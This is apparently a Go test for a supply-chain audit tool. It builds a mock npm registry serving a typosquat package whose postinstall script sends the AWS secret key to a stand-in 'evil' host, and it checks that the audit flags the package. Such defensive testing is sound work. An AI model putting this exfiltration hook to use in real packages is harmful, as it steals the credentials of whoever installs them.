package main

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"testing"
)

// A registry serving one malicious typosquat package.
func maliciousRegistry(t *testing.T) *httptest.Server {
	t.Helper()
	var tb bytes.Buffer
	gz := gzip.NewWriter(&tb)
	tw := tar.NewWriter(gz)
	pkgJSON := `{"name":"reqeusts","version":"0.0.1","scripts":{"postinstall":"node s.js"}}`
	for name, body := range map[string]string{
		"package/package.json": pkgJSON,
		"package/s.js":         "require('https').get('https://evil/'+process.env.AWS_SECRET_ACCESS_KEY)",
	} {
		tw.WriteHeader(&tar.Header{Name: name, Mode: 0o644, Size: int64(len(body))})
		tw.Write([]byte(body))
	}
	tw.Close()
	gz.Close()
	tarball := tb.Bytes()

	mux := http.NewServeMux()
	mux.HandleFunc("/reqeusts", func(w http.ResponseWriter, r *http.Request) {
		m := map[string]any{
			"name":      "reqeusts",
			"dist-tags": map[string]string{"latest": "0.0.1"},
			"time":      map[string]string{"created": "2026-06-06T00:00:00Z", "0.0.1": "2026-06-06T00:00:00Z"},
			"maintainers": []map[string]string{{"name": "x"}},
			"versions": map[string]any{"0.0.1": map[string]any{
				"name": "reqeusts", "version": "0.0.1",
				"dist": map[string]string{"tarball": "http://" + r.Host + "/t/reqeusts.tgz"},
			}},
		}
		json.NewEncoder(w).Encode(m)
	})
	mux.HandleFunc("/t/reqeusts.tgz", func(w http.ResponseWriter, r *http.Request) { w.Write(tarball) })
	return httptest.NewServer(mux)
}

func TestAuditFlagsMaliciousPackage(t *testing.T) {
	srv := maliciousRegistry(t)
	defer srv.Close()

	dir := t.TempDir()
	base := filepath.Join(dir, "base.json")
	head := filepath.Join(dir, "head.json")
	os.WriteFile(base, []byte(`{"lockfileVersion":3,"packages":{"":{"name":"app"}}}`), 0o644)
	os.WriteFile(head, []byte(`{"lockfileVersion":3,"packages":{"":{"name":"app"},"node_modules/reqeusts":{"version":"0.0.1"}}}`), 0o644)

	code := runAudit(auditOpts{
		base: base, head: head, registry: srv.URL, failOn: "high", format: "human",
		out: os.Stderr,
	})
	if code != 1 {
		t.Fatalf("expected exit code 1 for malicious package, got %d", code)
	}
}
